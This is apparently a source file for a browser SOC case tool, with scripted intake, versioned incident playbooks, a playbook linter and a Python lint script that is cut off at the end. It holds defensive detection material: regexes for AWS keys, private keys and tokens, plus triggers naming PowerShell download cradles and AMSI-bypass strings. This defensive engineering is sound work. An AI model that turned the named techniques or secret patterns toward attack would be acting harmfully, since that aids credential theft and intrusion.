const {useState,useEffect,useRef}=React;
interface Finding{t:string;c:string;s:number;th:string;a:string[]}
interface TimelineEvent{id:string;at:string;kind:string;summary:string;asset:string;actor:string;source:string;note:string;raw:string;truncated?:boolean}
interface Evid{k:string;t:string;g:string}
interface Act{t:string;b:string}
interface Note{id:number;t:string;x:number;y:number;col:string;shape:string;votes:number;cm:string[]}
interface Msg{r:string;t:string}
interface RStep{n:number;t:string;appr:boolean;st:string;note:string;by:string;at:number}
interface Run{id:string;pb:string;pbName:string;v:number;at:number;done:number;steps:RStep[];verdict:string;note:string}
interface PBLog{v:number;at:number;by:string;sum:string;body:string}
interface PB{id:string;name:string;kind:string;v:number;body:string;at:number;log:PBLog[];draft:string|null;prop:any}
interface Lib{kind:string;pbs:PB[];runs:Run[];set:{twoPerson:boolean}}
interface St{kind:string;name:string;cat:string;goal:string;problem:string;why:string;whynow:string;assets:string[];findings:Finding[];evidence:Evid[];actions:Act[];notes:Note[];chat:Msg[];ci:number;pushed:boolean;detail:number;hist:any[];timeline:TimelineEvent[];pbs:PB[];runs:Run[]}

// ---- SOC vocabulary ----
const TACTICS=['Reconnaissance','Resource Development','Initial Access','Execution','Persistence','Privilege Escalation','Defense Evasion','Credential Access','Discovery','Lateral Movement','Collection','Command and Control','Exfiltration','Impact'];
const W:any={open:1,partial:.6,contained:.2};
const CL:any={open:'Active, not contained',partial:'Partly mitigated',contained:'Contained'};
const CONC=/\b(hacked|compromised|breach(?:ed)?|malicious|ransomware|attacker|definitely|certainly|obviously|clearly)\b/i;
const ATTR=/\b(apt\s?\d+|nation[- ]state|state[- ]sponsored|lazarus|fancy bear|cozy bear|russian?|chinese|north korean?|iranian)\b/i;
const TIME=/\b\d{1,2}:\d{2}\b|\b20\d{2}-\d{2}-\d{2}\b/g;
const EVD:any={
 'Initial Access':['Authentication logs for the account, last 24 hours','Source IPs of failed and successful logins'],
 'Execution':['Full command line and parent process','Script block or process creation log'],
 'Persistence':['Group, role or scheduled task before and after','Who made the change, and the approval record'],
 'Privilege Escalation':['Privileged group membership before and after','Token or role assignment events'],
 'Defense Evasion':['Service stop or tamper events near the gap','Agent manager log for the host'],
 'Credential Access':['Failed and successful logons for the account','Source IPs and user agents'],
 'Discovery':['Commands that enumerate users, hosts or shares','Process tree for the session'],
 'Lateral Movement':['Remote logon events between hosts','Admin share or remote service creation'],
 'Collection':['File access and archive creation on the host','Volume of data read'],
 'Command and Control':['Outbound connections from the host','DNS queries for the destination'],
 'Exfiltration':['Bytes sent to external storage','Destination domain and account'],
 'Impact':['Backup, shadow copy and service state','File rename or encryption activity'],
 'Reconnaissance':['Scan sources and targets','Web or auth probing patterns'],
 'Resource Development':['Look-alike domains and certificates','Newly registered infrastructure']};
const SV=['#fef3c7','#fce7f3','#d1fae5','#fed7aa','#e0e7ff','#dbeafe'];

const Q=[['name',"Alert in. I'm Sal. What is the case title? (e.g. suspicious admin group change)"],['cat',"Which alert or source fired? (a Wazuh rule, an EDR detection, a user report...)"],['assets',"Which assets or accounts are involved? Separate them with commas."],['problem',"What happened? Facts only: who, what, where. Save the verdict for later."],['evidence',"Give me one indicator you have actually seen: an IP, domain, hash, username or command line."],['whynow',"Timeline: when did it start, and when did you notice? Add times if you have them."],['contain',"What containment is already in place? (account disabled, host isolated) or say none"]];

const FEAT=[['💬','Guided intake','Seven scripted questions fill your case skeleton. No AI guesswork.'],['🚨','Mistake radar','Flags verdicts before evidence, unsourced indicators, no timeline, no ATT&CK mapping, no containment decision, premature attribution.'],['🎚️','Containment weighting','Score = severity × assets hit × containment. Contained findings stay on the list at 20%.'],['🧩','Triage matrix','Impact against response effort. Stickies, votes, comments, presentation frames.'],['🔎','Indicator extractor','Paste a raw alert. Pull out IPs, domains, URLs, hashes, emails and CVEs. Defanged in the report.'],['📘','Versioned playbooks','Edit, diff, run checks, approve. One copy, a version number, a history you can restore.'],['▶️','Runs pinned to a version','Every investigation run records which playbook version it used and where it stalled.'],['📊','Dashboard','Risk by asset and ATT&CK tactic, containment balance, readiness over time.']];
const FAQ=[['is this ai?','no. the intake is scripted, the checks are pattern rules, and the score is plain math. nothing here is guessed.'],['is this a siem or an edr?','no. it stores nothing and watches nothing. the hunt page does run a small set of rules over events you paste or load, in your browser, so you can start a case from real logs. a match is a lead, not a verdict, and no match is not proof of safety.'],['how is the risk score worked out?','severity x number of assets hit x containment (active 1, partly mitigated 0.6, contained 0.2). contained findings are down-weighted, never deleted.'],['how do playbooks stay trustworthy?','one copy of each. you edit a draft, see a diff, propose it, and automatic checks run (all sections present, version bumped, no secrets, numbered steps, escalation path). only then can you approve it. the new version goes live and the old one stays in history.'],['which playbook did a run use?','every run pins the version it started on and shows when a newer version has gone live since.'],['how reliable is the indicator extractor?','it is pattern based. it finds the common shapes (ips, urls, hashes, emails, cves, and domains with common endings) and will miss some and mislabel some. check every result.'],['where does my data live?','your browser by default. sign in on the dashboard and it also saves to your own supabase workspace. do not paste credentials, personal data or regulated data into any demo tool until you have reviewed where it is stored.'],['what do the mistake checks catch?','a verdict stated before the evidence, indicators with no source, no timeline, no att&ck mapping, no containment or accepted-risk decision, and naming a threat actor without enough evidence.']];

const NAV=[['home','🏠','Home'],['case','🛠️','Case'],['timeline','◷','Timeline'],['triage','🧩','Triage'],['hunt','🔍','Hunt'],['playbooks','📘','Playbooks'],['runs','▶️','Runs'],['threats','🎯','Threats'],['dash','📊','Dash'],['toolkit','🧰','Toolkit'],['models','⚙','Models & adapters'],['network','⌁','Network terminal'],['theme','🎨','Theme'],['faq','❓','FAQ']];

// ---- Playbook model ----
const PB_SECTIONS=['1. Purpose','2. At a glance','3. Before you start','4. Triage','5. Investigation steps','6. Containment','7. Eradication and recovery','8. Escalation','9. Evidence to collect','10. Report card','11. Settings'];
function pbBody(o:any):string{const L=(a:string[])=>a.map((x:string)=>'- '+x).join('\n');
 return '# Playbook: '+o.name+'\n\n## 1. Purpose\n'+o.purpose+'\n\n## 2. At a glance\n'+L(['Triggers: '+o.trig,'Data needed: '+o.data,'Time budget: '+o.budget])+'\n\n## 3. Before you start\n'+L(o.pre)+'\n\n## 4. Triage\n'+L(o.triage)+'\n\n## 5. Investigation steps\n'+o.steps.map((x:string,i:number)=>(i+1)+'. '+x).join('\n')+'\n\n## 6. Containment\n'+L(o.contain)+'\n\n## 7. Eradication and recovery\n'+L(o.recover)+'\n\n## 8. Escalation\n'+L(o.escal)+'\n\n## 9. Evidence to collect\n'+L(o.collect)+'\n\n## 10. Report card\n'+L(['Verdict: true positive, benign, escalated or undetermined','Steps completed, steps stalled, time taken','Playbook version used'])+'\n\n## 11. Settings\n'+L(['version: 1','owner: '+(o.owner||'soc'),'review_every_days: 90'])+'\n'}
const PB_SEED:any[]=[
 {name:'account-manipulation',kind:'investigation',purpose:'Decide whether a change to an account (new admin, group membership, role or credential change) was authorized.',trig:'Windows security events 4728, 4732, 4756 (member added to a group) and 4738 (account changed); cloud admin audit role changes. MITRE T1098.',data:'Actor, target account, group or role, host, source IP, timestamp.',budget:'15 minutes',
  pre:['Confirm the alert is not a duplicate of an open case.','Find the change ticket or approval record, if one exists.'],
  triage:['A privileged group (Domain Admins, Administrators, cloud admin) means start at high severity.','A change made outside business hours raises severity one level.'],
  steps:['**Confirm the event** — who changed what, when, and from which host or IP.','**Who made the change** — is the actor an admin or service account? Check that actor\'s recent logins.','**Was it approved** — match the change to a ticket or approval record. (needs approval)','**Admin group check** — list the members of the affected group now and compare with the last known good list.','**Write the report card** — verdict, steps taken, version used.'],
  contain:['Remove the unauthorized member or role. Record who did it and when.','Disable or reset the actor account if it looks hijacked.'],
  recover:['Rotate credentials for the affected accounts.','Review other changes by the same actor in the last 7 days.'],
  escal:['Escalate to the identity team lead if a privileged group changed without a ticket.','Page the incident commander if the actor account shows signs of takeover.'],
  collect:['Raw event with event ID and timestamps.','Actor logon history, last 24 hours.','Group membership before and after.']},
 {name:'agent-offline',kind:'investigation',purpose:'Decide whether a security agent going silent is a routine outage or someone tampering with it.',trig:'Agent disconnected, or no keepalive for 15 minutes. MITRE T1562.001.',data:'Hostname, last keepalive, last logged-in user, network reachability.',budget:'10 minutes',
  pre:['Check for an approved maintenance window.','Check whether other agents on the same network segment are also offline.'],
  triage:['Many agents offline at once points to the network or the manager, not tampering.','One agent on a server or an admin workstation is higher priority.'],
  steps:['**Confirm the gap** — last keepalive time and how long the agent has been silent.','**Reach the host** — ping it or check the asset inventory to see whether it is powered on.','**Maintenance or outage** — match against maintenance windows and known outages.','**Tamper check** — look for service stop events and uninstall attempts just before the gap.','**Write the report card** — verdict, steps taken, version used.'],
  contain:['If tampering is likely, isolate the host using the EDR or the switch port.'],
  recover:['Restart or reinstall the agent and confirm it reports in.','Add a monitor so the same gap alerts sooner next time.'],
  escal:['Escalate to the endpoint team if the agent cannot be restored.','Escalate to the incident commander if service stop events came from a user session.'],
  collect:['Agent manager log around the disconnect.','Windows service events 7036 and 7045 near the gap.','Asset owner and location.']},
 {name:'suspicious-powershell',kind:'investigation',purpose:'Decide whether a PowerShell command is administration or an attack technique.',trig:'Encoded commands (-enc), download cradles (IEX, DownloadString), AMSI-bypass strings, or an Office app starting PowerShell. MITRE T1059.001.',data:'Full command line, parent process, user, host, script block log (event 4104).',budget:'20 minutes',
  pre:['Decode any base64 command before judging it.','Check whether the user and host normally run scripts.'],
  triage:['Office, a browser or a mail client as the parent process: start at high severity.','A known admin tool run by an admin in business hours: start at low.'],
  steps:['**Capture the command line** — full text, parent process and user.','**Decode and read it** — decode any base64, then say in one line what it does.','**Check where it reached** — outbound connections, downloaded files and child processes.','**Check the user and host** — does this match their normal work? Ask the user if needed. (needs approval)','**Write the report card** — verdict, steps taken, version used.'],
  contain:['Isolate the host if the command downloaded or ran unknown code.','Block the destination domain or IP at the proxy or firewall.'],
  recover:['Remove dropped files and scheduled tasks created by the script.','Reset credentials the host could have exposed.'],
  escal:['Escalate to the incident commander when the command reached the internet and ran unknown code.','Hand off to malware analysis with the decoded script attached.'],
  collect:['Script block log (event 4104) and process creation (event 4688 or Sysmon 1).','The decoded script text.','Network connections from the host during the run.']},
 {name:'triage',kind:'triage',purpose:'Give every new alert a severity, an owner and a next step within five minutes.',trig:'Any new alert in the queue.',data:'Alert title, source rule, asset, user, time.',budget:'5 minutes',
  pre:['Check the queue for duplicates of the same alert.','Open the asset record to see who owns it.'],
  triage:['Critical: active attacker behaviour on a server or an admin account.','High: likely malicious but limited to one host or user.','Medium: suspicious, needs more context.','Low: likely benign or informational.'],
  steps:['**Dedupe** — merge with an open case if it is the same activity.','**Classify** — pick a severity from section 4.','**Pick the playbook** — match the alert to an investigation playbook.','**Assign an owner** — one name, and a time for the first update.'],
  contain:['Only contain at triage when the alert is critical.'],
  recover:['None at triage. Hand off to the investigation playbook.'],
  escal:['Page the incident commander for any critical alert.'],
  collect:['Alert ID and raw event.','Asset owner.']}];
// SOC v7: analyst-reviewed procedures, local recommendations; no LLM/adapter calls occur here.
const PB_EXTENDED:any[]=[{"name":"password-spray","kind":"investigation","purpose":"Determine whether repeated failed logins across multiple accounts reflect credential spraying or normal authentication noise. Do not label an account compromised solely from failures.","trig":"Repeated failed logins against multiple distinct accounts from one source over a short time; MITRE T1110.003.","data":"Source IP, target accounts, event timestamps, MFA events, success/failure result, user agent, network and IAM source.","budget":"20 minutes","pre":["Confirm event timestamps and normalize timezones.","Check existing incidents and any authorized login testing."],"triage":["High when many identities are targeted and one or more successes follow; medium when failures only without other signals.","Do not assume the source IP belongs to the attacker; VPNs, corporate proxies, and NAT can group many users."],"steps":["**Bound the window** — identify first and last failed attempts and number of distinct accounts.","**Compare source and target** — check IP, user agents, tenants and affected accounts for shared patterns.","**Look for successful access** — inspect successful sign-ins and MFA/conditional-access results after the failed attempts.","**Rule out benign causes** — compare with service account rotations, password expiry, identity-provider outages and approved tests.","**Preserve evidence** — link raw event IDs and a timestamped query with counts, redacting credentials.","**Decide and document** — record findings, uncertainty and next update time."],"contain":["If unauthorized access is corroborated, request identity team approval to revoke sessions or disable affected accounts. (needs approval)","Apply rate limiting or access policies with identity owner review. (needs approval)"],"recover":["Review identity lockout policy and MFA coverage.","Monitor source, targeted accounts, and any new successes."],"escal":["Escalate to identity incident response if a suspicious login succeeds after the failures or privileged accounts are targeted.","Escalate broadly only if the scope and account impact justify it."],"collect":["Sign-in failure and success records with event IDs and times.","MFA challenges and conditional-access decisions.","Approved maintenance or testing tickets."]},{"name":"successful-login-after-failures","kind":"investigation","purpose":"Investigate a successful authentication shortly after anomalous failed attempts without assuming the same actor or an account takeover.","trig":"Successful sign-in correlated with earlier failed sign-ins for the account or source. MITRE T1078 / T1110.","data":"Sign-in correlation ID, account, IP, device, session, MFA and policy status, timestamps.","budget":"15 minutes","pre":["Preserve source identity and event correlation IDs.","Check whether account belongs to a privileged identity or service."],"triage":["High when a privileged identity is involved, the device is unknown, or MFA is bypassed or denied.","Lower priority if the user confirms legitimate activity and device context matches, but keep the audit trail."],"steps":["**Build auth sequence** — correlate failures and success using timestamps and stable identity fields.","**Check session context** — compare source IP, device, user agent, location signals and MFA policy outcomes.","**Check account changes** — look for role assignments, mailbox rules, new keys and token issuance after sign-in.","**Verify with owner** — request out-of-band user confirmation; do not rely only on the active session. (needs approval)","**Record evidence** — preserve the sign-in IDs, queries, and any independent confirmation.","**Document decision** — mark suspected compromise, benign or unresolved with explicit supporting facts."],"contain":["If takeover is reasonably indicated, request approval to revoke sessions and reset credentials. (needs approval)","Escalate if new privileged roles or sensitive access occurred."],"recover":["Confirm the legitimate owner can sign in with fresh credentials.","Monitor related identities and repeat login attempts."],"escal":["Notify incident commander for suspected privileged account takeover or sensitive data access.","Consult IAM on session invalidation scope."],"collect":["Correlated failed and successful sign-in event IDs.","MFA device registration and token issuance audit records.","Out-of-band user confirmation with time and channel."]},{"name":"outbound-data-transfer","kind":"investigation","purpose":"Determine whether an unusually large outbound transfer represents approved business activity or possible data exfiltration.","trig":"Spike in outbound bytes, unusual destination, or transfer following bulk file access; MITRE T1041 / T1567.","data":"Netflow/proxy/EDR, transfer byte counts, destination, process, owner, file sensitivity, approval ticket.","budget":"25 minutes","pre":["Record observation window and normal baseline for the host.","Do not copy sensitive file contents into unapproved systems."],"triage":["High if destination is unknown, source contains sensitive data, or transfer overlaps suspicious process activity.","Size alone is insufficient to infer exfiltration; backup, patch, and synchronization traffic are common."],"steps":["**Validate the transfer** — confirm byte counts, protocol, destination, user and source device.","**Identify process and destination** — correlate DNS, proxy, netflow and EDR records.","**Assess data exposure** — determine whether sensitive data was read before transfer without exporting its content.","**Check authorization** — compare against scheduled backup, sync, data migration or approved vendor transfer.","**Preserve relevant events** — record timestamps, query and source event IDs with hashes where feasible.","**Write scoped decision** — separate observed upload from confirmed data loss."],"contain":["If ongoing unauthorized transfer is supported by evidence, request network or endpoint owner approval to block the specific flow. (needs approval)","Do not isolate a critical production server without incident command review. (needs approval)"],"recover":["Inspect policy gaps and confirm critical data access logging.","Scope similar transfers from related hosts and accounts."],"escal":["Escalate immediately if regulated or proprietary data exposure is substantiated.","Inform legal/privacy function according to the incident policy; do not claim a reportable breach prematurely."],"collect":["Netflow/proxy records and byte totals.","Process tree and file-access metadata.","Change ticket or approved transfer request."]},{"name":"backend-5xx-stability","kind":"investigation","purpose":"Separate operational HTTP 5xx errors from potentially security-related degradation; stabilize the service before declaring an attack.","trig":"Elevated HTTP 5xx rates, service crashes, or backend timeouts. Operational reliability signal; not automatically a security detection.","data":"HTTP status histograms, deployment changes, traces, upstream errors, resource metrics, request volume.","budget":"15 minutes","pre":["Confirm scope, customer impact and expected baseline.","Check recent deployments and incident tickets first."],"triage":["Escalate availability impact by service criticality and user-facing error budget.","Do not classify 5xx errors as an intrusion without corroborating malicious indicators."],"steps":["**Quantify impact** — calculate 5xx numerator/denominator and affected routes over the same time window.","**Compare dependency health** — inspect database, queues, network, saturation and retries.","**Inspect recent changes** — compare deployment and feature-flag changes with onset.","**Check abuse signals** — rate spikes, anomalous auth failures or suspicious request paths only when supported.","**Preserve traces** — link sampled errors, correlation IDs and change history; remove secrets and PII.","**Choose response** — write a remediation hypothesis, owner, next update and security classification."],"contain":["Rollback or disable risky features only with service owner approval. (needs approval)","Apply temporary rate controls with site reliability review. (needs approval)"],"recover":["Restore error budget, confirm with synthetic and customer-facing probes.","Add regression tests and a post-incident review."],"escal":["Page on-call SRE for material user impact or prolonged SLO breach.","Escalate to SOC only when there are independent signs of malicious activity."],"collect":["Error-rate and latency charts for matching windows.","Correlated traces, deployment IDs and dependency metrics.","Change approvals and post-incident timeline."]},{"name":"agent-decision-review","kind":"investigation","purpose":"Review a proposed AI-assisted SOC action against observed evidence and authorization policy before an analyst can accept it.","trig":"Any suggestion produced by an LLM or LoRA agent, especially when it requests external actions or asserts a verdict.","data":"Model identifier, adapter version, input evidence refs, proposed tool and arguments, user scope, result/trace.","budget":"5 minutes","pre":["Keep model-generated reasoning as a hypothesis only.","Require data minimization: do not feed secrets or personal data into an unapproved endpoint."],"triage":["Any destructive change, account lock, outbound notification, or containment requires an authorized human.","Reject claims that cite missing evidence or tools outside allowlist."],"steps":["**Check source grounding** — every claim must reference a real case event or evidence ID.","**Validate tool call** — check allowed tool name, typed arguments, tenant scope, and read-only versus state change.","**Compare baseline** — ask whether deterministic rules or a standard playbook reach the same decision.","**Request approval for effects** — obtain human sign-off for containment, blocking, account reset or external submission. (needs approval)","**Capture trace** — record model/adapter IDs, tool results, timing, confidence limitations and decision.","**Escalate uncertainty** — prefer undetermined over inventing a verdict."],"contain":["Never execute a model-suggested destructive response automatically. (needs approval)"],"recover":["Rollback only through approved operational change processes.","Include false positives in offline evaluation after redaction and authorization."],"escal":["Escalate to SOC lead for policy-bypassing model output or unsupported critical finding.","Escalate adapter regressions to ML owner before enabling in production."],"collect":["Prompt/response identifiers with sensitive values redacted.","Source evidence IDs, tool name/arguments and observed outputs.","Approval record and model/adapter version."]}];
const PB_ROUTE_RULES:{id:string;tag:string;patterns:RegExp[]}[]=[
 {id:'password-spray',tag:'failed logins across accounts',patterns:[/password.spray/i,/multiple.account.*fail/i,/failed.login/i,/failed.sign.in/i,/authentication.failure/i,/brute.force/i]},
 {id:'successful-login-after-failures',tag:'success after failures',patterns:[/success.*after.*fail/i,/sign.in.success.*fail/i,/successful.*auth.*fail/i,/valid.accounts/i]},
 {id:'suspicious-powershell',tag:'PowerShell process or script',patterns:[/powershell/i,/encoded.command/i,/script.block/i,/downloadstring/i]},
 {id:'outbound-data-transfer',tag:'large outbound transfer',patterns:[/exfiltrat/i,/outbound.*transfer/i,/large.*upload/i,/data.*egress/i]},
 {id:'backend-5xx-stability',tag:'service error rate',patterns:[/\b5xx\b/i,/\b50[0-9]\b/i,/backend.*error/i,/server.*error/i]},
 {id:'account-manipulation',tag:'privileged access change',patterns:[/privileg.*(grant|escalat)/i,/admin.*group/i,/account.manipulat/i]},
 {id:'agent-offline',tag:'missing endpoint heartbeat',patterns:[/agent.*offline/i,/agent.*silent/i,/service.*tamper/i]},
];
function pbRecommendations(s:St,pbs:PB[]){
 const items:string[]=[s.name||'',s.problem||'',s.cat||'',...(Array.isArray(s.findings)?s.findings.flatMap((f:Finding)=>[f.t||'',f.th||'']):[]),...(Array.isArray(s.timeline)?s.timeline.slice(-80).map((e:TimelineEvent)=>(e.summary||'')+' '+(e.kind||'')):[])];
 const active=items.filter(x=>x.trim().length>0);
 return PB_ROUTE_RULES.map(r=>{const matches=active.filter(line=>r.patterns.some(p=>p.test(line)));return{...r,n:matches.length,examples:matches.slice(0,2)}}).filter(r=>r.n>0&&pbs.some(p=>p.id===r.id)).sort((a,b)=>b.n-a.n).slice(0,4);
}
function pbNewEntries(pbs:PB[],by:string){const ids=new Set(pbs.map(p=>p.id)),t=Date.now();return PB_EXTENDED.filter(p=>!ids.has(p.name)).map(o=>{const body=pbBody(o);return{id:o.name,name:o.name,kind:o.kind,v:1,body,at:t,log:[{v:1,at:t,by,sum:'approved starter reference; review before operational use',body}],draft:null,prop:null} as PB})}

function seedPbs():PB[]{const t=Date.now();return PB_SEED.concat(PB_EXTENDED).map((o:any)=>{const body=pbBody(o);return{id:o.name,name:o.name,kind:o.kind,v:1,body,at:t,log:[{v:1,at:t,by:'seed',sum:'starter playbook',body}],draft:null,prop:null}})}
function pbVersion(body:string):number{const m=body.match(/^\s*-?\s*version:\s*(\d+)/mi);return m?+m[1]:0}
function bumpVersion(body:string,v:number):string{return body.replace(/^(\s*-?\s*version:\s*)\d+/mi,'$1'+v)}
function pbSteps(body:string):any[]{const m=body.match(/## 5\. Investigation steps\n([\s\S]*?)(?=\n## |\s*$)/);if(!m)return [];
 return m[1].split('\n').map((l:string)=>l.match(/^\s*(\d+)\.\s+(.*\S)\s*$/)).filter(Boolean).map((x:any)=>{const raw:string=x[2];const b=raw.match(/\*\*(.+?)\*\*/);return{n:+x[1],t:(b?b[1]:raw).slice(0,80),txt:raw.replace(/\*\*/g,''),appr:/\(needs approval\)/i.test(raw)}})}
const SECRET=[/AKIA[0-9A-Z]{16}/,/-----BEGIN [A-Z ]*PRIVATE KEY-----/,/\b(?:password|passwd|secret|api[_-]?key|token)\s*[:=]\s*\S{6,}/i,/\bghp_[A-Za-z0-9]{20,}/,/\bxox[baprs]-[A-Za-z0-9-]{10,}/];
function lintPb(body:string,pb:PB):any[]{
 const heads=body.split('\n').filter((l:string)=>/^## /.test(l)).map((l:string)=>l.slice(3).trim());
 const missing=PB_SECTIONS.filter((x:string)=>!heads.includes(x));
 const idx=PB_SECTIONS.map((x:string)=>heads.indexOf(x));const ordered=idx.every((x:number,i:number)=>i===0||x>idx[i-1]);
 const nv=pbVersion(body);const st=pbSteps(body);const seq=st.length>=3&&st.every((x:any,i:number)=>x.n===i+1);
 const esc=body.match(/## 8\. Escalation\n([\s\S]*?)(?=\n## |\s*$)/);const hasEsc=!!esc&&/\S/.test(esc[1].replace(/[-\s]/g,''));
 const hit=SECRET.find((r:RegExp)=>r.test(body));
 return [
  {n:'All 11 sections present, in order',ok:!missing.length&&ordered,detail:missing.length?'missing: '+missing.join(', '):!ordered?'sections are out of order':''},
  {n:'Version bumped by one',ok:nv===pb.v+1,detail:'version: '+nv+', live is '+pb.v},
  {n:'No secrets or credentials',ok:!hit,detail:hit?'looks like a key, token or password. Remove it.':''},
  {n:'Steps are numbered 1, 2, 3...',ok:seq,detail:st.length+' steps found'+(seq?'':'. Need at least 3, numbered in order.')},
  {n:'Escalation path stated',ok:hasEsc,detail:hasEsc?'':'section 8 is empty'},
  {n:'Contains a real change',ok:body!==pb.body,detail:''}]}
function diffLines(a:string,b:string):{t:string;s:string}[]{const A=a.split('\n'),B=b.split('\n');const n=A.length,m=B.length;
 const D:number[][]=Array.from({length:n+1},()=>new Array(m+1).fill(0));
 for(let i=n-1;i>=0;i--)for(let j=m-1;j>=0;j--)D[i][j]=A[i]===B[j]?D[i+1][j+1]+1:Math.max(D[i+1][j],D[i][j+1]);
 const out:{t:string;s:string}[]=[];let i=0,j=0;
 while(i<n&&j<m){if(A[i]===B[j]){out.push({t:'same',s:A[i]});i++;j++}else if(D[i+1][j]>=D[i][j+1]){out.push({t:'rm',s:A[i]});i++}else{out.push({t:'add',s:B[j]});j++}}
 while(i<n){out.push({t:'rm',s:A[i++]})}while(j<m){out.push({t:'add',s:B[j++]})}return out}
function Diff({a,b}:any){if(a.split('\n').length+b.split('\n').length>800)return <p className="s">Too large to diff here.</p>;
 const d=diffLines(a,b);const ch=d.filter((x:any)=>x.t!=='same').length;if(!ch)return <p className="s">No changes.</p>;
 const keep=d.map((x:any,i:number)=>x.t!=='same'||(i>0&&d[i-1].t!=='same')||(i<d.length-1&&d[i+1].t!=='same'));
 const rows:any[]=[];let gap=false;d.forEach((x:any,i:number)=>{if(keep[i]){if(gap){rows.push({t:'hd',s:'@@ … @@'});gap=false}rows.push(x)}else gap=true});
 return <div className="diff" role="region" aria-label="changes vs live">{rows.map((x:any,i:number)=><div key={i} className={x.t==='add'?'ad':x.t==='rm'?'rm':x.t==='hd'?'hd':''}>{x.t==='add'?'+ ':x.t==='rm'?'- ':'  '}{x.s}</div>)}</div>}

// ---- case state ----
const caseBlank=()=>({kind:'soc-case',name:'',cat:'',goal:'Decide: true positive, benign, or escalate?',problem:'',why:'',whynow:'',assets:[] as string[],findings:[] as Finding[],evidence:[] as Evid[],actions:[] as Act[],notes:[] as Note[],chat:[] as Msg[],ci:0,pushed:false,detail:2,hist:[] as any[],timeline:[] as TimelineEvent[]});
const blank:St={...caseBlank(),pbs:[],runs:[]} as any;
const LIBNAME='SOC playbook library';
function useSt():[St,(p:Partial<St>)=>void]{const [s,set]=useState<St>(()=>{try{const o:any=JSON.parse(localStorage.getItem('soc1')||'{}');const m:any={...blank,...o};delete m.pbs;delete m.runs;return m}catch(e){return {...blank}}});useEffect(()=>{try{const c:any={...s};delete c.pbs;delete c.runs;localStorage.setItem('soc1',JSON.stringify(c))}catch(e){}},[s]);return [s,(p:Partial<St>)=>set(o=>{const n:any={...o,...p};delete n.pbs;delete n.runs;return n})]}
function useLib():[Lib,(p:Partial<Lib>)=>void]{const [l,set]=useState<Lib>(()=>{let o:any=null;try{o=JSON.parse(localStorage.getItem('soc-lib')||'null')}catch(e){}
 if(!o){try{const old:any=JSON.parse(localStorage.getItem('soc1')||'{}');o={pbs:old.pbs,runs:old.runs}}catch(e){o={}}}
 return{kind:'soc-library',pbs:Array.isArray(o&&o.pbs)&&o.pbs.length?o.pbs:seedPbs(),runs:Array.isArray(o&&o.runs)?o.runs:[],set:{twoPerson:!!(o&&o.set&&o.set.twoPerson)}}});
 useEffect(()=>{try{localStorage.setItem('soc-lib',JSON.stringify(l))}catch(e){}},[l]);
 return [l,(p:Partial<Lib>)=>set(o=>({...o,...p,kind:'soc-library'}))]}
const E=(x:string)=>x;

const GIT_KIT:{name:string;data:string}[]=[{"name": "tools/playbook_lint.py", "data": "#!/usr/bin/env python3\n\"\"\"Lint SOC playbooks with the same rules as the Spectacle SOC app. Stdlib only.\n\n  python3 tools/playbook_lint.py                      # lint every playbooks/**/*.md\n  python3 tools/playbook_lint.py --base origin/main   # also require version = base version + 1 for changed files\n\nExit code 1 if any playbook fails, so it can gate a pull request.\n\"\"\"\nimport argparse\nimport re\nimport subprocess\nimport sys\nfrom pathlib import Path\n\nSECTIONS = [\"1. Purpose\", \"2. At a glance\", \"3. Before you start\", \"4. Triage\",\n            \"5. Investigation steps\", \"6. Containment\", \"7. Eradication and recovery\",\n            \"8. Escalation\", \"9. Evidence to collect\", \"10. Report card\", \"11. Settings\"]\nSECRET = [re.compile(p, re.I if i == 2 else 0) for i, p in enumerate([\n    r\"AKIA[0-9A-Z]{16}\",\n    r\"-----BEGIN [A-Z ]*PRIVATE KEY-----\",\n    r\"\\b(?:password|passwd|secret|api[_-]?key|token)\\s*[:=]\\s*\\S{6,}\",\n    r\"\\bghp_[A-Za-z0-9]{20,}\",\n    r\"\\bxox[baprs]-[A-Za-z0-9-]{10,}\",\n])]\n\n\ndef version(body):\n    m = re.search(r\"^\\s*-?\\s*version:\\s*(\\d+)\", body, re.M | re.I)\n    return int(m.group(1)) if m else 0\n\n\ndef section(body, title):\n    m = re.search(r\"## \" + re.escape(title) + r\"\\n(.*?)(?=\\n## |\\s*\\Z)\", body, re.S)\n    return m.group(1) if m else None\n\n\ndef steps(body):\n    sec = section(body, \"5. Investigation steps\")\n    out = []\n    for line in (sec or \"\").split(\"\\n\"):\n        m = re.match(r\"^\\s*(\\d+)\\.\\s+(.*\\S)\\s*$\", line)\n        if m:\n            out.append(int(m.group(1)))\n    return out\n\n\ndef lint(body, base_version=None):\n    heads = [l[3:].strip() for l in body.split(\"\\n\") if l.startswith(\"## \")]\n    missing = [s for s in SECTIONS if s not in heads]\n    idx = [heads.index(s) if s in heads else -1 for s in SECTIONS]\n    ordered = all(i == 0 or idx[i] > idx[i - 1] for i in range(len(idx)))\n    st = steps(body)\n    esc = section(body, \"8. Escalation\")\n    v = version(body)\n    checks = [\n        (\"All 11 sections present, in order\", not missing and ordered,\n         (\"missing: \" + \", \".join(missing)) if missing else (\"\" if ordered else \"sections are out of order\")),\n        (\"No secrets or credentials\", not any(r.search(body) for r in SECRET), \"looks like a key, token or password\"),\n        (\"Steps are numbered 1, 2, 3...\", len(st) >= 3 and st == list(range(1, len(st) + 1)), f\"{len(st)} steps found\"),\n        (\"Escalation path stated\", bool(esc and re.sub(r\"[-\\s]\", \"\", esc)), \"section 8 is empty\"),\n        (\"Has a version\", v >= 1, f\"version: {v}\"),\n    ]\n    if base_version is not None:\n        checks.append((\"Version bumped by one\", v == base_version + 1, f\"version: {v}, base is {base_version}\"))\n    return checks\n\n\ndef git_show(ref, path):\n    r = subprocess.run([\"git\", \"show\", f\"{ref}:{path}\"], capture_output=True, text=True)\n    return r.stdout if r.returncode == 0 else None\n\n\ndef main():\n    ap = argparse.ArgumentParser()\n    ap.add_argument(\"--base\", help=\"git ref to compare against, e.g. origin/main\")\n    ap.add_argument(\"--dir\", default=\"playbooks\")\n    a = ap.parse_args()\n    files = sorted(Path(a.dir).rglob(\"*.md\"))\n    if not files:\n        print(f\"no playbooks found under {a.dir}/\")\n        return 1\n    failed = 0\n    for f in files:\n        body = f.read_text(encoding=\"utf-8\")\n        bv = None\n        if a.base:\n            old = git_show(a.base, f.as_posix())\n            if old is not None and old != body:\n                bv = version(old)\n            elif old is not None:\n                bv = None  # unchanged, no bump needed\n        for name, ok, detail in lint(body, bv):\n            if not ok:\n                failed += 1\n                print(f\"FAIL {f}: {name} ({detail})\")\n        else:\n            pass\n    print(f\"{len(files)} playbooks checked, {failed} problems\")\n    return 1 if failed else 0\n\n\nif __name__ == \"__main__\":\n    